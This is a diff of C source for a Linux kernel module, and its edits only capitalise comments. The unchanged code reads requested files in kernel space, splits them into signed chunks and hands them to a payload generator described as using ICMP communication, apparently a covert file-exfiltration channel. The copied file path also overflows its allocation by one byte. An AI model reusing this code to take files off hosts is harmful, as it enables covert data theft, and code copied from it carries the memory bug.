@@ -19,7 +19,7 @@ int read_file_thread_func(void* data);
 
 void read_file_chunks(const char* file_path)
 {
-    // open the file from user-space.
+    // Open the file from user-space.
     struct file *filp;
     filp = filp_open(file_path, O_RDONLY, 0);
     if (IS_ERR(filp)) {
@@ -27,7 +27,7 @@ void read_file_chunks(const char* file_path)
         return;
     }
     
-    // get the file size
+    // Get the file size
     loff_t file_size = vfs_llseek(filp, 0, SEEK_END);
     loff_t current_position = vfs_llseek(filp, 0, 0);
     if (0 != current_position) {
@@ -35,7 +35,7 @@ void read_file_chunks(const char* file_path)
         goto cleanup;
     }
 
-    // read the file, split it to chunks and add them to the chunks list
+    // Read the file, split it to chunks and add them to the chunks list
     bool is_first_chunk = true;
     while (current_position < file_size) {
         struct file_chunk *new_chunk = (struct file_chunk *)kmalloc(sizeof(struct file_chunk), GFP_ATOMIC);
@@ -51,11 +51,11 @@ void read_file_chunks(const char* file_path)
 
         new_chunk->chunk_size = 0;
 
-        size_t offset_in_buffer = 0;  // will include the signature if it is the first chunk.
+        size_t offset_in_buffer = 0;  // Will include the signature if it is the first chunk.
         size_t available_space_in_chunk = get_default_payload_chunk_size();
 
         if (is_first_chunk) {
-            // if it is the first chunk, we want to add a signature to it.
+            // If it is the first chunk, we want to add a signature to it.
             struct new_file_signature signature;
             signature.file_size = file_size;
             memcpy(signature.signature, DEFAULT_NEW_FILE_SIGNATURE, sizeof(DEFAULT_NEW_FILE_SIGNATURE));
@@ -70,17 +70,17 @@ void read_file_chunks(const char* file_path)
 
         ssize_t size_to_read = min(available_space_in_chunk, (size_t)(file_size - current_position));
 
-        // read the file's content.
-        // few important notes:
-        //      1. traditionally, the common way of reading files in the kernel is by using VFS functions 
-        //         like vfs_read. vfs_read invokes the f_ops of a given file to read it. in newer kernel
+        // Read the file's content.
+        // Few important notes:
+        //      1. Traditionally, the common way of reading files in the kernel is by using VFS functions 
+        //         like vfs_read. vfs_read invokes the f_ops of a given file to read it. In newer kernel
         //         versions, the functions kernel_read and kernel_write were introduced, replacing the "old" 
         //         vfs_XXX functions. using kernel_read and kernel_write is considered a good practice as it 
-        //         eliminates the need of messing with the FS (explained in 2). however, and from a very 
+        //         eliminates the need of messing with the FS (explained in 2). However, and from a very 
         //         mysterious reason, kernel_read didn't work here - hence vfs_read is used.
-        //      2. vfs_read expects to save the read data into a user-space buffer. in order to pass a 
-        //         kernel-space allocated buffer to it, we need to overwriting the kernel' FS. by setting the
-        //         kernel FS to KERNEL_DS, we actually tell it to expect a kernel-space buffer. note that
+        //      2. vfs_read expects to save the read data into a user-space buffer. In order to pass a 
+        //         kernel-space allocated buffer to it, we need to overwriting the kernel' FS. By setting the
+        //         kernel FS to KERNEL_DS, we actually tell it to expect a kernel-space buffer. Note that
         //         restoring the old FS after the call to vfs_read is super-important, otherwise kernel panic
         //         will be caused.
         mm_segment_t security_old_fs = get_fs();
@@ -107,7 +107,7 @@ void process_next_pending_file(void)
     mutex_unlock(&g_requestd_files_list_mutex);
 
     if (is_list_empty) {
-        // there are no pending files.
+        // There are no pending files.
         return;    
     }
 
@@ -119,20 +119,20 @@ void process_next_pending_file(void)
     }
     mutex_unlock(&g_requestd_files_list_mutex);
 
-    // copy the file path
+    // Copy the file path
     size_t next_pending_file_path_length = strlen(next_pending_file->file_path);
     char *file_path = (char*)kmalloc(next_pending_file_path_length, GFP_KERNEL);
     if (NULL == file_path) {
-        // if we fail to allocate space for the file path - we do not want to remove it from
-        // the list so we will be able to reach it in the next time. if we'll delete it right 
+        // If we fail to allocate space for the file path - we do not want to remove it from
+        // the list so we will be able to reach it in the next time. If we'll delete it right 
         // now - then the file won't be sent.
         return;
     }
     memcpy(file_path, next_pending_file->file_path, next_pending_file_path_length + 1);
     file_path[next_pending_file_path_length] = 0x00;
 
-    // remove the item from the list of pending files.
-    // also, free it as we are responsible for its memory.
+    // Remove the item from the list of pending files.
+    // Also, free it as we are responsible for its memory.
     mutex_lock(&g_requestd_files_list_mutex);
     list_del(&next_pending_file->l_head);
     mutex_unlock(&g_requestd_files_list_mutex);
@@ -141,7 +141,7 @@ void process_next_pending_file(void)
     kfree(next_pending_file);
 
     // TODO: support saving only X chunks (for dealing with large files)
-    // no need to acquire chunks_list_mutex as read_file_chunks does that internally.
+    // No need to acquire chunks_list_mutex as read_file_chunks does that internally.
     read_file_chunks(file_path);
 
     return;
@@ -156,8 +156,8 @@ int generate_payload(char *buffer, size_t *length)
         return -EINVAL;
     }
 
-    // try to acquire the chunks spinlock.
-    // we are using any blocking function to avoid latency in the ICMP communication.
+    // Try to acquire the chunks spinlock.
+    // We are using any blocking function to avoid latency in the ICMP communication.
     unsigned int flags;
     if (!spin_trylock_irqsave(&g_chunk_list_spinlock, flags)) {
         return -EIO;
@@ -189,7 +189,7 @@ error_and_spinlock_release:
 int read_file_thread_func(void* data)
 {
     while (!g_payload_generator_thread_stop) {
-        // no need to use locks as process_next_pending_file does that internally.
+        // No need to use locks as process_next_pending_file does that internally.
         process_next_pending_file();
         // TODO: replace with completion variable later on.
         msleep(3000);
